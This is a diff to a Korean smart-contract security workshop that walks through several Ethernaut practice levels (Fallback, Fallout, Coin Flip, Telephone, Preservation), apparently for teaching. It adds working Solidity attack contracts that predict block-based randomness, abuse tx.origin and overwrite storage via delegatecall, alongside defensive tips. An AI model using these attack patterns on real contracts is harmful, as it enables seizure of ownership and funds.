@@ -43,19 +43,148 @@ Duration: 60
 
 ### Fallback
 
-- **Fallback**: `receive()`/`fallback()`에서 `owner`를 덮어쓰는 실수를 악용해 컨트랙트를 장악할 수 있습니다. 비인가 호출이 넘어오지 못하도록 `onlyOwner` 가드와 초기 소유자 설정 로직을 분리합니다.
+[Fallback](https://ethernaut.openzeppelin.com/level/1)은 컨트랙트의 소유권을 탈취하고 잔액을 0으로 만드는 문제입니다.
+
+fallback 함수는 컨트랙트에 정의되어 있지 않은 함수가 호출될 경우 자동으로 호출되는 함수입니다. 이 문제에서는 트랙젝션을 보내는 클라이언트쪽 함수 sendTransaction을 사용해 컨트랙트를 호출하고 컨트랙트에 대응되는 함수가 없어서 fallback 함수가 실행됩니다. 이 때, fallback함수 내에서 몇 가지 조건(contribute되어 있음, value가 있음)을 만족하면 owner를 바꿀 수 있습니다.
+
+![Fallback Contribute](./images/fallback_contribute.png)
+
+먼저, 0.001 ether이하의 금액을 contribute 해줍시다.
+
+![Fallback Attack](./images/fallback_attack.png)
+
+sendTraction을 필요한 설정값(from, to, value)를 담아 fallback함수를 실행해줍니다.
+
+![Fallback Tip](./images/fallback_tip.png)
+
+이처럼 단순히 입금만 받는 함수에 권한 변경 로직을 넣으면 위험할 수 있습니다. 가능한 fallback에는 최소 로직만 넣어야 하고, 이벤트만 찍고 끝내는 것을 권장합니다.
+
+<aside class="positive"><p><strong>TIP</strong>
+fallback 함수에는 fallback, receive 두 가지가 존재하는데, 메시지에 데이터(calldata)가 담겨 있으면 fallback이 호출되고, 비어있으면 receive가 호출됩니다. </p></aside>
 
 ### Fallout
 
-- **Fallout**: 생성자 철자 오류로 인해 초기화를 누구나 호출할 수 있게 된 사례입니다. 배포 시점에만 실행되는 초기화 함수를 명확히 검증하고, 업그레이드형 컨트랙트라면 `initializer` 모디파이어를 적극 사용합니다.
+[Fallout](https://ethernaut.openzeppelin.com/level/1)은 컨트랙트의 소유권을 탈취하는 문제입니다.
 
-### CoinFlip
+자세히 보면 스마트컨트랙트의 이름 `Fallout`과 생성자 함수의 이름 `Fal1out`이 다릅니다. 즉, `Fal1out`는 생성자가 아니라 함수입니다. 이 함수를 호출해서 소유권을 탈취합니다.
 
-- **CoinFlip**: 공개된 블록 데이터를 그대로 난수로 사용하는 바람에 결과를 예측할 수 있습니다. 난수는 오라클/VRF와 같이 오프체인에 의존하거나 커밋-리빌 패턴으로 생성해야 합니다.
+![Fallout Solution](./images/fallout_solution.png)
+
+![Fallout Tip](./images/fallout_tip.png)
+
+solidity 0.4 이하의 버전에서는 함수의 이름을 컨트랙트의 이름과 동일하게 지정을 해주면 생성자로 취급합니다. 오타에 의한 문제를 방지하기 위해 그 이후의 버전부터는 `contructor`를 사용해서 생성자를 정의할 수 있도록 바뀌었습니다. 업그레이드형 컨트랙트의 `initializer` modifier를 사용하여 contructor를 대체합니다.
+
+```solidity
+contract FalloutLike is Initializable {
+    address public owner;
+    mapping(address => uint256) public allocations;
+
+    function initialize(address _owner) public initializer payable {
+        owner = _owner;
+        allocations[owner] = msg.value;
+    }
+}
+```
+
+Proxy 생성 후, Proxy 주소로 initialize를 호출해야 합니다.
+
+```solidity
+await FalloutLikeAtProxy.initialize(player, { value: ... });
+```
+
+<aside class="positive"><p><strong>스마트 컨트랙트의 업그레드를 위한 전략</strong></p>
+<p><strong>1. Contract migration</strong>: 새로운 스마트컨트랙트를 생성하고 이전 스마트컨트랙트의 상태정보를 마이그레이션하는 패턴입니다.</p>
+<p><strong>2. Data separation</strong>: 비즈니스로직과 상태정보들을 분리하는 패턴입니다.</p>
+<p><strong>3. Proxy patterns</strong>: 하지 않는 (immutable) 프록시 컨트랙트의 delegate 함수를 호출하여 수정된 비즈니스 스마트컨트랙트를 호출하는 패턴입니다.
+</p>
+<p><strong>4. Strategy pattern</strong>: 메인 스마트컨트랙트에는 변하지 않을 코어 비즈니스 로직을 구현하고, 나머지는 satellite(위성 컨트랙트)의 인터페이스를 활용해서 특정 기능을 수행하는 패턴. Proxy patterns 와 비슷하지만 로직을 가지고 있다는 점에서 차이점이 있습니다. </p>
+<p><strong>5. Diamond pattern</strong>: Proxy patterns의 개선된 버전으로, delegate 함수를 이용해서 한개 이상의 로직 컨트랙트를 호출합니다. 비즈니스 로직 컨트랙트를 여기에서는 facet(패싯)이라고 부릅니다. proxy 컨트랙트에는 호출할 서로 다른 facet의 address를 알기 위해서 function selector를 반드시 구현해 두어야 합니다.</p></aside></p>
+
+### Coin Flip
+
+[Coin Flip](https://ethernaut.openzeppelin.com/level/3)은 동전 던지기의 결과를 10번 연속으로 맞추는 문제입니다. 동전의 결과는 `coinFlip` 변수 값에 결정되고 이는 `blockValue`를 `FACTOR`로 나눈 값입니다. `FACTOR`는 고정된 값이고 `blockValue`는 block.number - 1를 해시한 값이므로 Flip은 `block.number`에 의해 결정됩니다.
+
+block.number는 **현재 실행된 트랜잭션이 포함된 블록의 번호** 입니다. 배포된 컨트랙트의 블록의 번호는 모두가 알 수 있고 이 번호를 가지고 같은 로직으로 시뮬레이션을 한다면 Flip값을 알 수 있습니다. 다음과 같이 공격할 컨트랙트를 짜주세요.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract Attack {
+    ICoinFlip public target;
+    uint256 private FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = ICoinFlip(_target);
+    }
+
+    function attack() public {
+        // CoinFlip이랑 동일하게 blockValue 계산
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = (coinFlip == 1);
+
+        // 얻은 값을 얻어서 그대로 호출
+        target.flip(side);
+    }
+}
+```
+
+contract의 address를 가져와서 Deploy할 때 인자로 넣어줍시다.
+
+![Coin Flip Address](./images/coinflip_address.png)
+
+![Coin Flip Deploy](./images/coinflip_deploy.png)
+
+10번 Attack 트랜잭션 호출 후 제출합니다.
+
+![Coin Flip Attack](./images/coinflip_attack.png)
 
 ### Telephone
 
-- **Telephone**: `tx.origin`을 검증에 사용해 중간 컨트랙트를 통한 호출을 허용해 버린 사례입니다. 인증에는 반드시 `msg.sender`와 역할 기반 제어를 사용합니다.
+[Telephone](https://ethernaut.openzeppelin.com/level/4)은 컨트랙트의 소유권을 탈취하는 문제입니다. 컨트랙트를 살펴보면 `tx.origin`과 `msg.sender`가 서로 다를 때만 owner를 바꿉니다. `tx.origin`는 맨 처음 트랜잭션을 보낸 EOA(지갑 주소)입니다. 즉, 컨트랙트를 통해 changeOwner를 호출하면 owner를 변경할 수 있습니다.
+
+다음과 같이 공격용 컨트랙트를 짜줍시다.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttack {
+    ITelephone public target;
+
+    constructor(address _target) {
+        target = ITelephone(_target);
+    }
+
+    function attack(address _player) public {
+        target.changeOwner(_player);
+    }
+}
+```
+
+![Telephone Address](./images/telephone_address.png)
+
+컨트랙트의 주소와 내 주소를 확인합니다.
+
+![Telephone Deploy](./images/telephone_deploy.png)
+
+![Telephone Attack](./images/telephone_attack.png)
+
+Telephone 컨트랙트 주소를 넣어 배포하고 Attack 트랜잭션을 호출합니다.
+
+![Telephone Tip](./images/telephone_tip.png)
+
+tx.origin을 권한 체크에 쓰면, 누군가 나를 속여서 공격 컨트랙트를 호출하게 만들었을 때 그 컨트랙트가 내 지갑 주소를 가장해서 내 자산을 마음대로 빼갈 수 있습니다. 그래서 OpenZeppelin, ConsenSys 등의 감사기관이 권한 체크, 자산 전송, 보안 관련 로직에 `tx.origin`을 사용하는 것을 금지합니다.
 
 ### Token
 
@@ -178,10 +307,6 @@ modifier noReentrant() {
 
 ![Re-entrancy Tip](./images/reentrancy_tip.png)
 
-### Preservation
-
-- **Preservation**: `delegatecall`을 통해 호출한 라이브러리의 스토리지 레이아웃 차이를 악용해 상태를 덮어썼습니다. 라이브러리 주소를 임의로 바꾸지 못하도록 고정하거나 업그레이드 시 접근 제어를 강화합니다.
-
 ### Elevator
 
 [Elevator](https://ethernaut.openzeppelin.com/level/11)은 빌딩의 꼭대기에 도달하는 문제입니다. 컨트랙트에 보면 top이라는 boll 타입의 변수가 있는데 이 값을 true로 바꾸면 됩니다.
@@ -247,6 +372,48 @@ contract Building is IBuilding {
 
 ![Elevator Tip](./images/elevator_tip.png)
 
+### Preservation
+
+[Preservation](https://ethernaut.openzeppelin.com/level/15)은 서로 다른 두 개의 시간대(timezone)에 대한 시간을 저장하기 위한 라이브러리를 사용한다. 생성자는 각각의 시간을 저장하기 위해 두 개의 라이브러리 인스턴스를 생성한다. 여기서 목표는 주어진 컨트랙트의 소유권을 탈취하는 것입니다.
+
+delegatecall은 호출된 컨트랙트의 코드를 현재 컨트랙트의 storage layout 기준으로 실행합니다. 각 Library의 storedTime은 slot 0에 있고 Preservation의 slot 0은 timeZone1Library 주소 이기 때문에 첫 번째 delegatecall을 이용해 timeZone1Library 주소를 원하는 값으로 덮어쓸 수 있습니다. 다음과 같이 공격 컨트랙트를 작성해주세요.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackPreservation {
+    // 동일한 slot layout
+    address public timeZone1Library; // slot0
+    address public timeZone2Library; // slot1
+    address public owner;            // slot2
+    uint256 public storedTime;       // slot3
+
+    function setTime(uint256 _time) public {
+        owner = tx.origin; // tx.origin은 player
+    }
+}
+```
+
+![Preservation Deploy](./images/preservation_deploy.png)
+
+컨트랙트를 배포하고 주소값을 받아와 주세요.
+
+![Preservation Solution](./images/preservation_solution.png)
+
+먼저 `setFirstTime`을 호출할 때 공격 컨트랙트 주소를 전달해 첫 번째 타임존 라이브러리를 공격 컨트랙트로 바꿔주세요.
+다시 `setFirstTime`을 호출해 공격 컨트랙트를 실행해주세요.
+
+![Preservation Tip](./images/preservation_tip.png)
+
+<aside class="positive"><p><strong>TIP </strong>Storage slot</p>
+<p>
+Storage를 구성하는 32바이트(256비트)짜리 저장 공간 블록입니다. Solidity 컴파일러는 각 상태 변수를 slot에 순서대로 매핑해두고 접근합니다. 값이 32바이트보다 작으면 packing(32바이트로 채움) 됩니다.</p></aside>
+
+uint256, address, bool 전부 결국 32바이트 슬롯에 저장되기 때문에 `setFirstTime`의 인자로 주소를 넘겨도 정상적으로 실행됩니다. 이때, delegatecall처럼 다른 컨트랙트의 코드가 실행돼도 저장될 슬롯은 그대로 유지되므로(context-preserving) 취약점 발생할 수 있습니다.
+
+delegatecall을 사용할 때는 context preserving 된다는 시실과 storage 변수들이 어떻게 저장되고 접근되는지 이해가 필요하다.
+
 ## 프로젝트 취약점 점검
 
 Duration: 10
@@ -283,5 +450,5 @@ Duration: 1
 
 ### 참고 자료
 
-1. [openzeppelin의 contract관련 개발 문서](https://docs.openzeppelin.com/contracts)
-2. [ethernaut](https://ethernaut.openzeppelin.com)
+1. [Ethernaut](https://ethernaut.openzeppelin.com)
+2. [Ethernaut 풀이](https://piatoss3612.tistory.com/category/Solidity/Hacking)
